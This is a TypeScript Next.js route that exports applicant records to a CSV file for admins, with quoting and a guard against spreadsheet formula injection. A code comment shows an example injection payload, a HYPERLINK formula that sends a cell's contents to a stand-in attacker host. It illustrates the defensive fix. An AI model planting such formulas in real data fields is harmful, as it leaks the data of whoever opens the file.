import { NextRequest, NextResponse } from "next/server";
import { db } from "@/lib/db";
import { requireAdmin } from "@/lib/session";
import type { CreativeStatus } from "@prisma/client";

const VALID_STATUSES: CreativeStatus[] = ["PENDING", "APPROVED", "REJECTED", "INACTIVE", "FLAGGED"];

// Every column on Creative except the headshot itself, which is a multi-hundred-KB
// base64 blob that would make the file unopenable in a spreadsheet — its presence
// is noted as a yes/no instead. This is the "backup outside the review UI" the
// client asked for (her fear was a response existing only inside the
// approve/reject workflow, invisible anywhere else).
const COLUMNS = [
  "id", "status", "createdAt", "updatedAt",
  "firstName", "lastName", "pronouns", "email", "phone", "address", "location",
  "howHeard", "referralName",
  "bio", "pccGoals", "previousCollaborators", "unionMemberships", "education", "additionalNotes",
  "roles", "mediums", "languages", "specialSkills", "equipment",
  "experienceLevel", "yearsExperience", "completedProjects", "notableAchievements", "references",
  "website", "imdb", "instagram", "linkedin", "vimeo",
  "rateStructure", "rateRange", "ratePublic", "availability", "travel",
  "preferredProjectTypes", "collaborationPreferences",
  "hasHeadshot", "workSamples",
  "promoConsent", "featured", "featuredUntil", "adminNotes",
] as const;

function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  // workSamples is an array of objects ({title, medium, ...}); everything else
  // that's an array (roles, mediums, ...) is an array of plain strings. Only the
  // latter reads sensibly as a joined list — an array of objects needs to stay
  // JSON so it isn't flattened into "[object Object]; [object Object]".
  const str = Array.isArray(value)
    ? value.every((v) => typeof v === "string" || typeof v === "number")
      ? value.join("; ")
      : JSON.stringify(value)
    : value instanceof Date
    ? value.toISOString()
    : typeof value === "object"
    ? JSON.stringify(value)
    : String(value);
  // Quote every cell and escape embedded quotes — simplest way to stay correct
  // for free-text fields (bios, notes) that can contain commas, quotes, and newlines.
  return `"${neutralizeFormula(str).replace(/"/g, '""')}"`;
}

/**
 * Stops a spreadsheet from treating an applicant's text as a formula.
 *
 * Every cell here is free text typed into the public enrollment form, and this
 * file exists to be opened in Excel / Google Sheets. A bio or "additional
 * notes" beginning with `=`, `+`, `-`, `@` is parsed as a formula on open, so a
 * value like `=HYPERLINK("https://evil.example?"&A1,"Click")` runs in the
 * client's spreadsheet with her data. Quoting does not prevent this — Excel
 * evaluates `"=..."` just the same — so the leading character has to be
 * defused.
 *
 * A leading apostrophe is the standard fix: spreadsheets read it as "treat the
 * rest as literal text" and don't display it. Tab and carriage return are
 * included because they're stripped during parsing, which would otherwise
 * expose the character behind them.
 */
function neutralizeFormula(str: string): string {
  return /^[=+\-@\t\r]/.test(str) ? `'${str}` : str;
}

export async function GET(request: NextRequest) {
  await requireAdmin();

  const statusParam = request.nextUrl.searchParams.get("status");
  const status = VALID_STATUSES.includes(statusParam as CreativeStatus) ? (statusParam as CreativeStatus) : null;

  const creatives = await db.creative.findMany({
    where: status ? { status } : {},
    orderBy: { createdAt: "desc" },
  });

  const rows = creatives.map((c) => {
    const record: Record<string, unknown> = { ...c, hasHeadshot: Boolean(c.headshot) };
    return COLUMNS.map((col) => csvCell(record[col])).join(",");
  });

  const csv = [COLUMNS.join(","), ...rows].join("\r\n");
  const filename = `pcc-applications-${status ?? "all"}-${new Date().toISOString().slice(0, 10)}.csv`;

  return new NextResponse(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="${filename}"`,
    },
  });
}
